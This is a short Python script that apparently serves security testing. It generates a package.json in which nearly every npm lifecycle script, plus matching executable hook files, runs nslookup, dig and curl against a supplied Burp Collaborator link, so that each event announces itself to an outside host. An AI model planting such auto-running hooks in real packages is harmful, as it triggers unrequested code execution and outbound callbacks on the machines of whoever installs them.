import os
import json
import stat 
import sys

if len(sys.argv) < 2:
    print("Usage: python3 gen.py <burpcollaborator link>")
    exit()
else:
    burpcollaborator_link = sys.argv[1]

prefixable_events = [
    "syndistest", # custom
    "lint",
    "install",
    "prepare",
    "publish",
    "pack",
    "restart",
    "start",
    "stop",
    "test",
    "uninstall",
    "version",
    "serve",
    "shrinkwrap"
]

non_prefixable_events = [
    "prepublishOnly"
]

expression_template = lambda bin,event,method : f'{bin} {method}.{bin}.{event}.{burpcollaborator_link};'
script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)

os.makedirs('node_modules',exist_ok=True)
os.makedirs('node_modules/.hooks',exist_ok=True)

package_json_dict = {'name':'node_tests','version':'1.0.0','description':'','main':'index.js'}

def write_hook(event):
    path = f"node_modules/.hooks/{event}"
    with open(path,"w") as f:
        f.write("#!/usr/bin/env bash\n")
        f.write(script_template(event,"hook"))
    file_stats = os.stat(path)
    os.chmod(path,file_stats.st_mode | stat.S_IEXEC)

scripts = {}
for event in prefixable_events:
    scripts[event] = script_template(event,"script")
    write_hook(event)
    for prefix in ["pre","post"]:
        scripts[prefix+event] = script_template(prefix+event,"script")
        write_hook(prefix+event)
package_json_dict["scripts"] = scripts

with open("package.json","w") as f:
    json.dump(package_json_dict,f)
